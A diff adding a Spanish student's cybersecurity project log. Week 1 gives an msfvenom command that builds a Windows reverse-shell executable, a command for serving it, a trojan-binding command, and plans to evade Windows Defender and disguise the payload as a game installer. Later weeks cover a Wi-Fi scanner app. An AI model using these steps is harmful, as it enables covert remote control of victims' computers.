@@ -1,0 +1,34 @@
+Bitacora-Proyecto ciberseguridad
+Consepto
+ 	aun que aun no lo tengo definido mi idea es que cree carpetas de maera autónoma en la computadora de la victima, o por lo menos 	dejar que uno la manipule manualmente.
+Semana-1_
+Dia-1_
+aprendí el como se puede hacer un spyware o una madre que ocntrola la pc a distancia desde ubuntu (kali Linux originalmente) para poder modificar los archivos de una pc ajena. además de aprender algunos comandos nuevos, entre estos es el ifconfig para ver los datos de la consola, mkdir para crear carpetas, y un nuevo comando que usare llamado msfvenom que es de un tipo de directorio externo
+además de esto por medio de cmd ya se como unificar archivos en uno solo, algo como un txt dentro de una imagen con este comando, "copy /d [archivo.formato] + [troyano o otro virus.formato] [nombre.formato]" con esto se crea el archivo convinado, pero creo que falt que el archivo haga algo por medio de comandos, luego veo eso
+Por ultimo el comando que uso para iniciar el ubuntu fue  msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.27.95.107 LPORT=443 -f exe -o virus.exe y el otro es sudo python3 -m http.server 80 (esto por que ubuntu usa python3).
+Dia-2_
+después de indagar por un momento y arreglar algunos asuntos encontré 3 problemas a solucionar_
+ 	Que pase windows defender sin alertarlo
+ 	que cree un archivo en el dispositivo sin necesidad del administrados
+ 	Que sea mas aitomatizado y que no tenga que manipular todo desde cmd, o a lo mucho ejecutar un proceso automatizado
+Después de indagarlo el proyecto esta casi listo, puedo manipular archivos por medio de consola cmd y en si el archivo esta oculto en un juego para dicimularlo, cin el plis de camuflarlo como una instalación "oficial" del juego.
+Dia-3_
+todavía no se me ocurren métodos mas que los que estuve investigando, pueto que aun que son complicados son mas simples, confomre a los días estaré intentando actualizar esta bitácora
+Semana-2_
+Dia-1_
+Después de que me cambiaran el proyecto actualmente estoy desarrollando una app destinada para celular que corre con python, con ello busco que la app detecte cosas como la seguridad de la contraseña, las redes disponibles, si tiene contraseña o no, si la red es segura para conectarse en el caso de que sea publica y lo mas importante es que identifique la potencia recibida de la misma, hasta haora solo muestra el SSID la señal y el tipo de seguridad, pero pronto y después de verlo con el maestro vere como puedo optimizarla para que reinicie el detector de redes por si solo y que muestre mas información y las clasifique.
+Dia-2_
+Ya empeze a entender como funciona, y aun que la verdad tuve problemas con ayuda de la IA los anduve resolviendo, lo mas problemático es e¿l tema de la actualización de redes pero ya tabajare en ello
+Dia-3_
+ya tengo algo funcional pero todavía no es suficiente, no clasifica las redes, trabajare en ello
+Semana-3
+Dia-1_
+Dejo de funcionar, estoy intentando arreglarlo pero no me da el tiempo, intentare dedicarle mas y ver el progreso
+Dia-2_
+Ya vi el problema, escanner.py no estaba funcionando correctamente, ya solo es arreglar eso y ver como van las cosas
+Dia-3_
+lo logre, se ve bien y ya es funcional, después de que no funcionara otra vez por lo del escanner.py ya lo resolvi. Lo subiré a GitHub con el readme.md
+
+
+¡AVISO!- La bitácora solo tomara en cuenta tiempo de desarrollo e investigación con algún asunto que 	interfiera que sea externo a ello.
+ 
